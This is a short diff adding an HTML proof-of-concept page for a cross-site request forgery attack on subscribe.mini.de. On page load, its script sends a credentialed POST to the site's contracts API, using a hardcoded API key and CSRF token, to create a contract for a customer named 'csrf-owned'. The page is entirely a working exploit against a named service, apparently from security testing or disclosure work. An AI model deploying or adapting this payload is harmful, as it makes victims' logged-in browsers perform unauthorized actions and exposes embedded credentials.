@@ -1,0 +1,28 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF PoC for MINI</title>
+  </head>
+  <body>
+    <h1>CSRF Attack PoC - subscribe.mini.de</h1>
+
+    <script>
+      fetch("https://subscribe.mini.de/ams-api/rest/contracts", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json",
+          "X-API-KEY": "d441352539f37fa67ca3c3bab886d3b41dde0c86",
+          "X-CSRF-TOKEN": "7d58dc4a-940e-4d5b-bb1e-fce65ff4cd5e"
+        },
+        body: JSON.stringify({
+          type: "21",
+          customer: "csrf-owned"
+        })
+      })
+      .then(r => r.text())
+      .then(console.log);
+    </script>
+  </body>
+</html>
